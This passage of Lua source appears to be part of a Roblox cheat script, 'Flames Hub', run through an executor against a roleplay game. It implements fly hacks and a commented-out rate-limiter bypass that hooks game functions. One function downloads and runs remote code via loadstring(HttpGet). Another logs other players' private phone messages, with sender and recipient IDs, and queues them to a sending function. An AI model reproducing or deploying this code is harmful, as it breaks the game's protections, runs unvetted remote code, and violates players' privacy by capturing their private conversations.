            local speedNow = ((vfly and (getgenv().VehicleFlySpeed or getgenv().FlySpeed)) or getgenv().FlySpeed) * 50
            local look = cam.CFrame
            local moveVec = ((look.LookVector * (CONTROL.F + CONTROL.B)) + ((look * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.Q + CONTROL.E) * 0.2, 0).p) - look.p))

            if moveVec.Magnitude > 0 then
               moveVec = moveVec.Unit
               BV.Velocity = moveVec * speedNow
            else
               BV.Velocity = BV.Velocity * 0.9
            end

            BG.CFrame = cam.CFrame
         end)

         getgenv().flyKeyDown = UIS.InputBegan:Connect(function(input, gp)
            if gp then return end
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 1 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = -1 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = -1 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 1 end
            if getgenv().QEfly then
               if input.KeyCode == Enum.KeyCode.E then CONTROL.Q = 1 end
               if input.KeyCode == Enum.KeyCode.Q then CONTROL.E = -1 end
            end
            pcall(function() cam.CameraType = Enum.CameraType.Track end)
         end)

         getgenv().flyKeyUp = UIS.InputEnded:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 0 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = 0 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = 0 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 0 end
            if input.KeyCode == Enum.KeyCode.E then CONTROL.Q = 0 end
            if input.KeyCode == Enum.KeyCode.Q then CONTROL.E = 0 end
         end)

         notify("Success", "Fly enabled (PC) | Speed: "..tostring(getgenv().FlySpeed), 5)
         return
      end

      local ok, controlModule = pcall(function()
         return require(plr:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
      end)
      if not ok or not controlModule then
         notify("Warning", "ControlModule unavailable; using simple touch fallback.", 5)
         getgenv().mobileFlyConn = RunService.RenderStepped:Connect(function()
            if not getgenv().FlyEnabled then return end
            BG.CFrame = cam.CFrame
            BV.Velocity = Vector3.zero
         end)
         return
      end

      getgenv().mobileFlyConn = RunService.RenderStepped:Connect(function()
         if not getgenv().FlyEnabled then return end
         if not hrp or not hum or not cam then return end
         BG.CFrame = cam.CFrame

         local direction = controlModule:GetMoveVector()
         local speedScaled = ((vfly and (getgenv().VehicleFlySpeed or getgenv().FlySpeed)) or getgenv().FlySpeed) * 50

         if direction.Magnitude > 0 then
            BV.Velocity = (cam.CFrame.LookVector * -direction.Z + cam.CFrame.RightVector * direction.X) * speedScaled
         else
            BV.Velocity = Vector3.zero
         end
      end)

      notify("Success", "Fly enabled (Mobile) | Speed: "..tostring(getgenv().FlySpeed), 5)
   end

   print("enable fly function good.")

   getgenv().DisableFly = function()
      if not getgenv().FlyEnabled then
         return notify("Warning", "Fly is not enabled!", 5)
      end

      getgenv().FlyEnabled = false
      if getgenv().flyKeyDown then getgenv().flyKeyDown:Disconnect() getgenv().flyKeyDown = nil end
      if getgenv().flyKeyUp then getgenv().flyKeyUp:Disconnect() getgenv().flyKeyUp = nil end
      if getgenv().pcFlyConn then getgenv().pcFlyConn:Disconnect() getgenv().pcFlyConn = nil end
      if getgenv().mobileFlyConn then getgenv().mobileFlyConn:Disconnect() getgenv().mobileFlyConn = nil end

      local plr = getgenv().LocalPlayer
      local char = getgenv().Character or getgenv().get_char(plr)
      local hrp = get_root(plr)
      local hum = get_human(plr)

      if hrp then
         if hrp:FindFirstChild("FlyGyro") then hrp.FlyGyro:Destroy() end
         if hrp:FindFirstChild("FlyVelocity") then hrp.FlyVelocity:Destroy() end
      end

      if hum then hum.PlatformStand = false end

      notify("Success", "Fly is now disabled.", 5)
   end

   print("disable fly function good.")

   getgenv().VehicleStates = getgenv().VehicleStates or {}

   if not getgenv().VehicleStates[getgenv().LocalPlayer.Name] then
      getgenv().VehicleStates[getgenv().LocalPlayer.Name] = getgenv().LocalPlayer
   end

   print("blur has been executed.")

   --[[if not getgenv().patch_rate_limit then
      if hookfunction then
         notify("Info", "Applying RateLimit bypass... (Phone messages bypass).", 6)
         local RateLimiter = require(getgenv().RateLimiter)
         local ret_true = function() return true end
         local ret_false = function() return false end
         local hook = function(t)
            hookfunction(t.clock, ret_true)
            hookfunction(t.is_limited, ret_false)
            return t
         end

         local old; old = hookfunction(RateLimiter.new, newcclosure(function(...)
            return hook(old(...))
         end))

         if filtergc then
            getgenv().patch_rate_limit = true
            for _, t in filtergc("table", {Keys = "clock", "is_limited"}) do
               hook(t)
            end
            notify("Success", "Bypassed RateLimit for Phone messages.", 5)
         else
            getgenv().patch_rate_limit = true
            notify("Info", "Applying RateLimit bypass... (Phone messages bypass).", 6)

            getgenv().Main_Messages_RateLimiter_Bypass_Loop_Task = getgenv().Main_Messages_RateLimiter_Bypass_Loop_Task or task.spawn(function()
               notify("Success", "Bypassed RateLimit for Phone messages.", 5)
               while getgenv().patch_rate_limit == true do
                  for _, obj in getgc(true) do
                     if typeof(obj) == "table" and rawget(obj, "clock") and rawget(obj, "is_limited") then
                        if obj.clock() ~= true or obj.is_limited() ~= false then
                           pcall(function()
                              local mt = getrawmetatable(obj)
                              if mt and rawset then
                                 rawset(obj, "clock", function() return true end)
                                 rawset(obj, "is_limited", function() return false end)
                              elseif not rawset and mt then
                                 obj.clock = function() return true end
                                 obj.is_limited = function() return false end
                              end
                           end)
                        end
                     end
                  end
                  task.wait(10)
               end
            end)
         end
      else
         notify("Info", "Applying RateLimit bypass... (Phone messages bypass).", 6)
         getgenv().patch_rate_limit = true

         getgenv().MessagesModuleScript_RateLimiter_Bypass_Task = getgenv().MessagesModuleScript_RateLimiter_Bypass_Task or task.spawn(function()
            notify("Success", "Bypassed RateLimit for Phone messages.", 5)
            while getgenv().patch_rate_limit == true do
               for _, obj in getgc(true) do
                  if typeof(obj) == "table" and rawget(obj, "clock") and rawget(obj, "is_limited") then
                     if obj.clock() ~= true or obj.is_limited() ~= false then
                        pcall(function()
                           local mt = getrawmetatable(obj)
                           if mt and rawset then
                              rawset(obj, "clock", function() return true end)
                              rawset(obj, "is_limited", function() return false end)
                           elseif not rawset and mt then
                              obj.clock = function() return true end
                              obj.is_limited = function() return false end
                           end
                        end)
                     end
                  end
               end
               task.wait(10)
            end
         end)
      end
   end--]]

   getgenv().find_core_folder = getgenv().find_core_folder or function()
      for _, v in ipairs(getgenv().ReplicatedStorage:GetDescendants()) do
         if v:IsA("Folder") and v.Name == "Core" and v.Parent.Name == "Modules" then
            return v
         end
      end

      return nil
   end

   getgenv().youtube_music_player = function()
      if getgenv().yt_music_player_loaded_flames_hub then
         return getgenv().notify("Warning", "YouTube Music player is already loaded.", 5)
      end

      getgenv().yt_music_player_loaded_flames_hub = true
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/yt_music_player_backup.lua'))()
   end

   print("find core folder function good.")

   getgenv().send_msg_phone = getgenv().send_msg_phone or function(player, msg)
      local Core_Folder = find_core_folder()
      if not Core_Folder then
         return notify("Error", "Core Folder not found (patched?).", 5)
      end
      local Privacy = require(Core_Folder:FindFirstChild("Privacy"))
      if not Privacy then
         return notify("Error", "Privacy ModuleScript not found (patched?).", 5)
      end

      local function get_dm_hash(id)
         local my = Players.LocalPlayer.UserId
         if not id then return nil end
         local a, b = (id < my) and id or my, (id < my) and my or id
         return tostring(a) .. " " .. tostring(b)
      end

      local function send_dm(target, text)
         local targetId = target.UserId
         local hash = get_dm_hash(targetId)
         if not hash then return false end

         local ok, res = pcall(function()
            return Privacy.send_message("messages", hash, text)
         end)

         if not ok or res == false then
            getgenv().Sending_DMs_Main_Non_Loop_Task = getgenv().Sending_DMs_Main_Non_Loop_Task or task.spawn(function()
               notify("Error", "Send message failed: "..tostring(res), 7)
            end)
            return false
         end

         return true
      end

      local text_to_send = msg

      if not text_to_send or text_to_send == "" then
         return getgenv().notify("Error", "Please input a valid message to send!", 5)
      end

      send_dm(player, text_to_send)
   end

   local ui_mod = require(getgenv().ReplicatedStorage.Modules.Core.UI)
   local data_mod = require(getgenv().ReplicatedStorage.Modules.Core:FindFirstChild("Data", true))
   local messages_mod = require(getgenv().ReplicatedStorage:FindFirstChild("Messages", true))
   local scroll_frame = ui_mod.get("MessagesChatScrollFrame")
   local function get_other_from_hash(hash, known_id)
      local id1, id2 = hash:match("(%-?%d+) (%-?%d+)")
      id1, id2 = tonumber(id1), tonumber(id2)
      if not id1 or not id2 then return nil end
      if id1 == known_id then return id2 end
      if id2 == known_id then return id1 end
      return nil
   end

   local function get_recipient_id()
      local convo = messages_mod.active_conversation
      if not convo then return nil end
      return get_other_from_hash(convo.hash, game.Players.LocalPlayer.UserId)
   end

   local function get_recipient_from_message(msg_id, sender_id)
      for _, convo in ipairs(data_mod.conversations or {}) do
         if convo.messages then
            for _, msg in ipairs(convo.messages) do
               if msg.id == msg_id then
                  return get_other_from_hash(convo.hash, sender_id)
               end
            end
         end
      end
      return nil
   end

   local function get_sender_id(msg_id)
      for _, convo in ipairs(data_mod.conversations or {}) do
         if convo.messages then
            for _, msg in ipairs(convo.messages) do
               if msg.id == msg_id then
                  return msg.sender_id, convo.hash
               end
            end
         end
      end
      return nil, nil
   end

   getgenv().chat_logged_ids = getgenv().chat_logged_ids or {}
   getgenv().chat_frame_locks = getgenv().chat_frame_locks or {}
   getgenv().chat_text_conns = getgenv().chat_text_conns or {}
   getgenv().chat_send_queue = getgenv().chat_send_queue or {}
   getgenv().chat_sending = getgenv().chat_sending or false

   local function resolve_name(uid)
      for _, p in ipairs(Players:GetPlayers()) do
         if p.UserId == uid then
            return p.Name
         end
      end
      return "User_" .. uid
   end

   local function enqueue_message(msg)
      table.insert(getgenv().chat_send_queue, msg)
   end

   if not getgenv().chat_sender_thread then
      getgenv().chat_sender_thread = task.spawn(function()
         while true do
            if not getgenv().chat_sending and #getgenv().chat_send_queue > 0 then
               getgenv().chat_sending = true
               local msg = table.remove(getgenv().chat_send_queue, 1)
               pcall(function()
                  if getgenv().Send_Main_Issues then
                     getgenv().Send_Main_Issues(msg)
                  end
               end)
               wait(0.01)
               getgenv().chat_sending = false
            end
            wait()
         end
      end)
   end

   local function log_message(frame, txt, msg_id, sender_id)
      local unique_id = msg_id .. "|" .. txt.Text
      if getgenv().chat_logged_ids[unique_id] then return end
      getgenv().chat_logged_ids[unique_id] = true

      local sender_name = resolve_name(sender_id)
      local recipient_id = tonumber(frame:GetAttribute("recipient_id"))
         or get_recipient_from_message(msg_id, sender_id)
         or get_recipient_id()

      local recipient_name = recipient_id and resolve_name(recipient_id) or "unknown"
      local recipient_str  = recipient_id
         and (recipient_name .. " (" .. recipient_id .. ")")
         or "unknown"

      enqueue_message(
         sender_name .. " (" .. sender_id .. " to " .. recipient_str .. "): " .. txt.Text
      )
   end

   local function process_message_frame(frame)
      if frame.Name ~= "Message" then return end
      local msg_id = frame:GetAttribute("id")
      if type(msg_id) ~= "string" then return end
      local sender_id, hash = get_sender_id(msg_id)
      if not sender_id then return end
      local recipient_id = get_other_from_hash(hash, sender_id)
      if recipient_id then
         frame:SetAttribute("recipient_id", recipient_id)
      end

      local txt = frame:FindFirstChildWhichIsA("TextLabel", true)
      if not txt then return end

      if not getgenv().chat_text_conns[txt] then
         getgenv().chat_text_conns[txt] = txt:GetPropertyChangedSignal("Text"):Connect(function()
            if txt.Text == "" then return end
            task.delay(0.02, function()
               if txt.Text ~= "" then
                  log_message(frame, txt, msg_id, sender_id)
               end
            end)
         end)
      end

      task.delay(0.05, function()
         if txt and txt.Text ~= "" then
            log_message(frame, txt, msg_id, sender_id)
         end
      end)
   end

   for _, v in ipairs(scroll_frame:GetChildren()) do
      process_message_frame(v)
   end

   if getgenv().chat_descendant_conn then
      getgenv().chat_descendant_conn:Disconnect()
   end
   fw(0.1)
   getgenv().chat_descendant_conn = scroll_frame.DescendantAdded:Connect(function(v)
      local frame = v:FindFirstAncestor("Message")
      if frame then
         process_message_frame(frame)
      end
   end)

   print("send message function good.")

   getgenv().toggle_rgb_streetlights = function(toggle)
      local genv = getgenv()

      if toggle == true then
         if genv.RGB_Street_Lights_NightTime_Loop or genv.StreetLightRainbowConnection then
            return genv.notify("Warning", "RGB/Rainbow StreetLights is already running!", 5)
         end

         local Map = Workspace:FindFirstChild("Map", true)
         if not Map then
            return genv.notify("Error", "Map Folder not found inside of Workspace!", 6)
         end

         local StreetLs = Map:FindFirstChild("StreetLights", true)
         if not StreetLs then
            return genv.notify("Error", "StreetLights not found inside of Map Folder!", 5)
         end

         if typeof(genv.all_street_lights) ~= "table" then
            genv.all_street_lights = {}
         end

         if next(genv.all_street_lights) == nil then
            for _, v in ipairs(StreetLs:GetDescendants()) do
               if v:IsA("PointLight") then
                  table.insert(genv.all_street_lights, v)
               end
            end
         end

         local hue = 0
         genv.RGB_Street_Lights_NightTime_Loop = true

         genv.notify("Success", "RGB/Rainbow StreetLights enabled. They will animate at night.", 10)

         genv.StreetLightRainbowConnection = RunService.Heartbeat:Connect(function(dt)
            local clock_time = Lighting.ClockTime
            if clock_time < 18.5 and clock_time > 7.5 then
               return
            end

            hue = (hue + dt * 0.0833) % 1
            local color = Color3.fromHSV(hue, 1, 1)

            for i = #genv.all_street_lights, 1, -1 do
               local light = genv.all_street_lights[i]
               if not light or not light.Parent then
                  table.remove(genv.all_street_lights, i)
               else
                  light.Color = color
               end
            end
         end)
      elseif toggle == false then
         if not genv.RGB_Street_Lights_NightTime_Loop then
            return genv.notify("Warning", "RGB/Rainbow StreetLights is not enabled!", 5)
         end

         genv.RGB_Street_Lights_NightTime_Loop = false

         if genv.StreetLightRainbowConnection then
            genv.StreetLightRainbowConnection:Disconnect()
            genv.StreetLightRainbowConnection = nil
         end

         genv.notify("Success", "RGB/Rainbow StreetLights disabled.", 10)
      end
   end

   print("toggle rgb streetlights good.")

   getgenv().AdminPrefix = getgenv().AdminPrefix or "-"
   getgenv().AdminVersion = getgenv().AdminVersion or "v1.0"
   getgenv().AdminConfigChanged = getgenv().AdminConfigChanged or Instance.new("BindableEvent")

   getgenv().setAdminPrefix = function(newPrefix)
      if typeof(newPrefix) == "string" and getgenv().AdminPrefix ~= newPrefix then
         getgenv().AdminPrefix = newPrefix
         getgenv().AdminConfigChanged:Fire("prefix")
      end
   end

   getgenv().setAdminVersion = function(newVersion)
      if typeof(newVersion) == "string" and getgenv().AdminVersion ~= newVersion then
         getgenv().AdminVersion = newVersion
         getgenv().AdminConfigChanged:Fire("version")
      end
   end

   local ismobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

   getgenv().CommandsMenu_Tooltip_Init = function()
      if getgenv().CommandsMenu_Tooltip and getgenv().CommandsMenu_Tooltip.Parent then return end

      local tooltipGui = parent_gui:FindFirstChild("AdminTooltipUI") or Instance.new("ScreenGui")
      tooltipGui.Name = "AdminTooltipUI"
      tooltipGui.ResetOnSpawn = false
      tooltipGui.IgnoreGuiInset = true
      tooltipGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
      tooltipGui.DisplayOrder = 9999
      tooltipGui.Parent = parent_gui

      local tooltip = tooltipGui:FindFirstChild("CommandTooltip") or Instance.new("TextLabel")
      tooltip.Name = "CommandTooltip"
      tooltip.BackgroundColor3 = Color3.fromRGB(50,50,50)
      tooltip.TextColor3 = Color3.new(1,1,1)
      tooltip.Font = Enum.Font.GothamSemibold
      tooltip.TextSize = 14
      tooltip.TextWrapped = true
      tooltip.AutomaticSize = Enum.AutomaticSize.XY
      tooltip.BackgroundTransparency = 1
      tooltip.TextTransparency = 1
      tooltip.Visible = false
      tooltip.ZIndex = 10000
      tooltip.AnchorPoint = Vector2.new(0,1)
      tooltip.TextYAlignment = Enum.TextYAlignment.Top
      tooltip.Parent = tooltipGui

      if not tooltip:FindFirstChildOfClass("UICorner") then
         Instance.new("UICorner", tooltip).CornerRadius = UDim.new(0,6)
         local pad = Instance.new("UIPadding", tooltip)
         pad.PaddingLeft = UDim.new(0,6)
         pad.PaddingRight = UDim.new(0,6)
         pad.PaddingTop = UDim.new(0,3)
         pad.PaddingBottom = UDim.new(0,3)
      end

      getgenv().CommandsMenu_Tooltip = tooltip
   end

   if not getgenv().CommandsMenu_Tooltip_MouseHooked then
      getgenv().CommandsMenu_Tooltip_MouseHooked = true
      local mousePos = Vector2.new()

      UserInputService.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement then
            mousePos = Vector2.new(input.Position.X, input.Position.Y)
         end
      end)

      RunService.RenderStepped:Connect(function()
         local tooltip = getgenv().CommandsMenu_Tooltip
         if tooltip and tooltip.Visible then
            tooltip.Position = UDim2.fromOffset(mousePos.X + 15, mousePos.Y - 10)
         end
      end)
   end

   getgenv().CommandsMenu_ShowTooltip = function(text)
      local tooltip = getgenv().CommandsMenu_Tooltip
      if not tooltip or text == "" then return end
      tooltip.Text = text
      tooltip.Visible = true
      TweenService:Create(tooltip, TweenInfo.new(0.15), {
         BackgroundTransparency = 0.15,
         TextTransparency = 0
      }):Play()
   end

   getgenv().CommandsMenu_HideTooltip = function()
      local tooltip = getgenv().CommandsMenu_Tooltip
      if not tooltip then return end
      TweenService:Create(tooltip, TweenInfo.new(0.15), {
         BackgroundTransparency = 1,
         TextTransparency = 1
      }):Play()
      task.delay(0.15, function()
         if tooltip then tooltip.Visible = false end
      end)
   end

   getgenv().CommandsMenu_Rebuild = function(Filter)
      local Scroll = getgenv().CommandsMenu_Scroll
      if not Scroll then return end

      Filter = Filter and string.lower(Filter) or ""

      for _, V in ipairs(Scroll:GetChildren()) do
         if not V:IsA("UIListLayout") and not V:IsA("UIPadding") then
            V:Destroy()
         end
      end

      local Rebuilt = string.gsub(cmdsString, "{prefix}", getgenv().AdminPrefix)

      for Line in string.gmatch(Rebuilt, "[^\r\n]+") do
         Line = Line:match("^%s*(.-)%s*$")
         if Line ~= "" then
            local Parts = string.split(Line, " - ")
            local Cmd_Text = Parts[1] or Line
            local Desc = Parts[2] or ""

            if Filter ~= "" then
               local Cmd_Lower = string.lower(Cmd_Text)
               local Desc_Lower = string.lower(Desc)
               if not string.find(Cmd_Lower, Filter, 1, true) and not string.find(Desc_Lower, Filter, 1, true) then

               end
            end

            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(1, -10, 0, ismobile and 70 or 60)
            Frame.BackgroundTransparency = 1
            Frame.Parent = Scroll

            local Label = Instance.new("TextLabel")
            Label.AutomaticSize = Enum.AutomaticSize.Y
            Label.Size = UDim2.new(1, -130, 0, 20)
            Label.BackgroundTransparency = 1
            Label.Font = Enum.Font.GothamSemibold
            Label.TextSize = 15
            Label.TextColor3 = Color3.fromRGB(0, 0, 0)
            Label.TextWrapped = true
            Label.RichText = true
            Label.TextXAlignment = Enum.TextXAlignment.Left
            Label.TextYAlignment = Enum.TextYAlignment.Top
            Label.Text = Cmd_Text
            Label.Parent = Frame

            local Button = Instance.new("TextButton")
            Button.Size = UDim2.new(0, ismobile and 110 or 100, 0, ismobile and 44 or 30)
            Button.Position = UDim2.new(1, -(ismobile and 110 or 100), 0, ismobile and 13 or 15)
            Button.Text = "Run"
            Button.Font = Enum.Font.GothamBold
            Button.TextSize = 14
            Button.TextColor3 = Color3.new(1, 1, 1)
            Button.BackgroundColor3 = Color3.fromRGB(27, 42, 53)
            Button.Parent = Frame
            Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 6)

            Label.MouseEnter:Connect(function()
               getgenv().CommandsMenu_ShowTooltip(Desc)
            end)
            Label.MouseLeave:Connect(function()
               getgenv().CommandsMenu_HideTooltip()
            end)
            Button.MouseEnter:Connect(function()
               getgenv().CommandsMenu_ShowTooltip(Desc)
            end)
            Button.MouseLeave:Connect(function()
               getgenv().CommandsMenu_HideTooltip()
            end)
            Button.MouseButton1Click:Connect(function()
               if getgenv().DirectCommand then
                  getgenv().DirectCommand(Cmd_Text)
               end
            end)
         end
      end
   end

   getgenv().CommandsMenu = function()
      if getgenv().CommandsMenuGUI and getgenv().CommandsMenuGUI.Parent then
         getgenv().CommandsMenuGUI.Enabled = true
         getgenv().CommandsMenu_Rebuild()
         return
      end

      getgenv().CommandsMenu_Tooltip_Init()

      local gui = Instance.new("ScreenGui")
      gui.Name = "AdminCommandList_LifeTogether_RP"
      gui.ResetOnSpawn = false
      gui.Parent = parent_gui
      getgenv().CommandsMenuGUI = gui

      local Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context = Instance.new("Frame")
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.AnchorPoint = Vector2.new(0.5, 0.5)
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.Position = UDim2.new(0.5, 0, 0.5, 0)
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.Size = ismobile and UDim2.new(0.7, 0, 1.02, 0) or UDim2.new(0,600,0,500)
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.BackgroundColor3 = Color3.fromRGB(151,0,0)
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.BackgroundTransparency = ismobile and 0.05 or 0
      Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.Parent = gui
      Instance.new("UICorner", Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context).CornerRadius = UDim.new(0,12)
      while not Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context or not Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context.Parent do
         getgenv().heartbeat_wait_function(3)
      end
      dragify(Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context)
      --getgenv().flowrgb("Commands_Menu_Main_Flow_RGB_Connection", 3, Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context, true)

      local header = Instance.new("Frame")
      header.Size = UDim2.new(1,0,0,36)
      header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
      header.Parent = Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context
      Instance.new("UICorner", header).CornerRadius = UDim.new(0,12)

      local title = Instance.new("TextLabel")
      title.Size = UDim2.new(1,-60,1,0)
      title.Position = UDim2.new(0,12,0,0)
      title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
      title.BackgroundTransparency = 1
      title.Text = "⭐ Flames Hub - Administrator Commands ⭐"
      title.Font = Enum.Font.GothamBold
      title.TextSize = 16
      title.TextColor3 = Color3.new(1,1,1)
      title.TextXAlignment = Enum.TextXAlignment.Left
      title.Parent = header
      while not title or not title.Parent do
         getgenv().heartbeat_wait_function(3)
      end

      if ismobile then
         local close = Instance.new("TextButton")
         close.Size = UDim2.new(0,36,0,36)
         close.Position = UDim2.new(1,-40,0,0)
         close.Text = "X"
         close.TextScaled = true
         close.Font = Enum.Font.GothamBold
         close.TextSize = 24
         close.TextColor3 = Color3.new(1,1,1)
         close.BackgroundColor3 = Color3.fromRGB(90,0,0)
         close.Parent = header
         Instance.new("UICorner", close).CornerRadius = UDim.new(1,0)
         close.MouseButton1Click:Connect(function()
            gui.Enabled = false
         end)
      else
         local close = Instance.new("TextButton")
         close.Size = UDim2.new(0,32,0,32)
         close.Position = UDim2.new(1,-36,0,2)
         close.Text = "X"
         close.TextScaled = true
         close.Font = Enum.Font.GothamBold
         close.TextSize = 18
         close.TextColor3 = Color3.new(1,1,1)
         close.BackgroundColor3 = Color3.fromRGB(90,0,0)
         close.Parent = header
         Instance.new("UICorner", close).CornerRadius = UDim.new(1,0)
         close.MouseButton1Click:Connect(function()
            gui.Enabled = false
         end)
      end

      local Search_Bar_Height = ismobile and 38 or 30
      local Search_Bar = Instance.new("TextBox")
      Search_Bar.Size = UDim2.new(1, -20, 0, Search_Bar_Height)
      Search_Bar.Position = UDim2.new(0, 10, 0, 42)
      Search_Bar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
      Search_Bar.PlaceholderText = "Search commands..."
      Search_Bar.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
      Search_Bar.Text = ""
      Search_Bar.Font = Enum.Font.GothamSemibold
      Search_Bar.TextSize = 14
      Search_Bar.TextColor3 = Color3.new(1, 1, 1)
      Search_Bar.ClearTextOnFocus = false
      Search_Bar.Parent = Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context
      Instance.new("UICorner", Search_Bar).CornerRadius = UDim.new(0, 6)
      local Search_Pad = Instance.new("UIPadding", Search_Bar)
      Search_Pad.PaddingLeft = UDim.new(0, 8)
      Search_Pad.PaddingRight = UDim.new(0, 8)
      local Scroll_Top = 42 + Search_Bar_Height + 8

      local scroll = Instance.new("ScrollingFrame")
      scroll.Size = UDim2.new(1, -20, 1, -(Scroll_Top + 10))
      scroll.Position = UDim2.new(0, 10, 0, Scroll_Top)
      scroll.BackgroundTransparency = 1
      scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
      scroll.ScrollBarThickness = 6
      scroll.Parent = Commands_Menu_Main_Frame_Content_In_Flames_Hub_Context

      local layout = Instance.new("UIListLayout")
      layout.Padding = UDim.new(0,6)
      layout.Parent = scroll

      local padding = Instance.new("UIPadding")
      padding.PaddingTop = UDim.new(0,5)
      padding.PaddingBottom = UDim.new(0,5)
      padding.PaddingLeft = UDim.new(0,5)
      padding.PaddingRight = UDim.new(0,5)
      padding.Parent = scroll

      Search_Bar:GetPropertyChangedSignal("Text"):Connect(function()
         getgenv().CommandsMenu_Rebuild(Search_Bar.Text)
      end)

      getgenv().CommandsMenu_Scroll = scroll
      getgenv().CommandsMenu_Rebuild()
   end

   getgenv().AdminConfigChanged.Event:Connect(function(Kind)
      if Kind == "prefix" then
         getgenv().CommandsMenu_Rebuild()
      elseif Kind == "version" then
         if getgenv().CommandsMenu_VersionLabel then
            getgenv().CommandsMenu_VersionLabel.Text = "Version: " .. getgenv().AdminVersion
         end
      end
   end)

   local excluded_functions = {
      HttpGet = true,
      appendfile = true,
      base64_decode = true,
      base64_encode = true,
      base64decode = true,
      base64encode = true,
      cansignalreplicate = true,
      checkcaller = true,
      checkclosure = true,
      clear_teleport_queue = true,
      cleardrawcache = true,
      clearqueueonteleport = true,
      clearteleportqueue = true,
      clonefunction = true,
      cloneref = true,
      clonereference = true,
      compareinstances = true,
      consoleclear = true,
      consolecreate = true,
      consoledestroy = true,
      consoleerror = true,
      consoleinput = true,
      consoleprint = true,
      consolesettitle = true,
      consolewarn = true,
      create_comm_channel = true,
      createrenderobj = true,
      createrenderobject = true,
      decompile = true,
      delfile = true,
      delfolder = true,
      dofile = true,
      dumpstring = true,
      filtergc = true,
      fireclickdetector = true,
      fireproximityprompt = true,
      firesignal = true,
      firetouchinterest = true,
      get_actor_threads = true,
      get_actors = true,
      get_comm_channel = true,
      get_deleted_actors = true,
      get_hidden_gui = true,
      get_hwid = true,
      get_internal_parent = true,
      get_namecall_method = true,
      get_thread_identity = true,
      get_user_identifier = true,
      getactors = true,
      getactorthreads = true,
      getallthreads = true,
      getbspval = true,
      getcallbackmember = true,
      getcallbackvalue = true,
      getcallingscript = true,
      getcaps = true,
      getclosurecaps = true,
      getconnection = true,
      getconnections = true,
      getconstant = true,
      getconstants = true,
      getcustomasset = true,
      getdeletedactors = true,
      getexecutorname = true,
      getfenv = true,
      getfflag = true,
      getfpscap = true,
      getfunctionhash = true,
      getgc = true,
      getgenv = true,
      gethiddenprop = true,
      gethiddenproperty = true,
      gethui = true,
      gethwid = true,
      getidentity = true,
      getinfo = true,
      getinstances = true,
      getinternalparent = true,
      getloadedmodules = true,
      getnamecallmethod = true,
      getnilinstances = true,
      getobjects = true,
      getpcd = true,
      getproto = true,
      getprotos = true,
      getproximitypromptduration = true,
      getrawmetatable = true,
      getreg = true,
      getregistry = true,
      getrenderproperty = true,
      getrendersteppedlist = true,
      getrenv = true,
      getrunningscripts = true,
      getsafeenv = true,
      getscriptbytecode = true,
      getscriptclosure = true,
      getscriptfromthread = true,
      getscriptfunction = true,
      getscripthash = true,
      getscripts = true,
      getsenv = true,
      getsimulationradius = true,
      getstack = true,
      getsynasset = true,
      gettenv = true,
      getthreadcontext = true,
      getthreadidentity = true,
      getupvalue = true,
      getupvalues = true,
      hookfunc = true,
      hookfunction = true,
      hookmetamethod = true,
      http_request = true,
      httpget = true,
      identifyexecutor = true,
      is_parallel = true,
      is_readonly = true,
      iscclosure = true,
      isexecutorclosure = true,
      isfile = true,
      isfolder = true,
      isfunctionhooked = true,
      isgameactive = true,
      islclosure = true,
      isnetworkowner = true,
      isnewcclosure = true,
      isourclosure = true,
      isourthread = true,
      isparallel = true,
      isrbxactive = true,
      isreadonly = true,
      isrenderobj = true,
      isscriptable = true,
      isuntouched = true,
      isvalidlevel = true,
      iswindowactive = true,
      keyclick = true,
      keypress = true,
      keyrelease = true,
      keytap = true,
      listfiles = true,
      loadfile = true,
      loadstring = true,
      lz4compress = true,
      lz4decompress = true,
      makefolder = true,
      makereadonly = true,
      makewriteable = true,
      messagebox = true,
      messageboxasync = true,
      mouse1click = true,
      mouse1press = true,
      mouse1release = true,
      mouse2click = true,
      mouse2press = true,
      mouse2release = true,
      mousemoveabs = true,
      mousemoverel = true,
      mousescroll = true,
      newcclosure = true,
      newlclosure = true,
      queue_on_teleport = true,
      queueonteleport = true,
      rconsoleclear = true,
      rconsolecreate = true,
      rconsoledestroy = true,
      rconsoleerr = true,
      rconsoleerror = true,
      rconsolehide = true,
      rconsoleinfo = true,
      rconsoleinput = true,
      rconsolename = true,
      rconsoleprint = true,
      rconsolesettitle = true,
      rconsoleshow = true,
      rconsolewarn = true,
      readfile = true,
      replaceclosure = true,
      replicatesignal = true,
      request = true,
      require = true,
      restorefunc = true,
      restorefunction = true,
      run_on_actor = true,
      run_on_thread = true,
      saveinstance = true,
      set_internal_parent = true,
      set_namecall_method = true,
      set_readonly = true,
      set_thread_identity = true,
